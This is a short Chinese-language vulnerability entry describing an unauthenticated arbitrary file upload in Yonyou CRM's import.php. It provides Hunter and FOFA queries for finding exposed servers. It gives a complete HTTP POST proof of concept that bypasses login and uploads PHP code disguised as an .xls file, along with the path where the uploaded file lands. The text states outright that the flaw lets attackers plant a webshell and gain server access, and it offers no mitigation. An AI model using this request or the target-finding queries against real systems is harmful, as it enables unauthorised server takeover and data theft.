# 用友CRM客户关系管理系统import.php存在任意文件上传漏洞

用友CRM客户关系管理系统import.php存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传webshell文件，从而获取到服务器权限。

## hunter

```yaml
app.name="用友 CRM"
```

## fofa

```yaml
body="用友U8CRM"
```

## poc

```yaml
POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Length: 277
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
Upgrade-Insecure-Requests: 1

------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="xfile"; filename="11.xls"

<?php phpinfo();?>
------WebKitFormBoundarye0z8QbHs79gL8vW5
Content-Disposition: form-data; name="combo"

help.php
------WebKitFormBoundarye0z8QbHs79gL8vW5--
```

![image-20240719191343917](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191913006.png)

文件路径：`http://ip/tmpfile/help.php`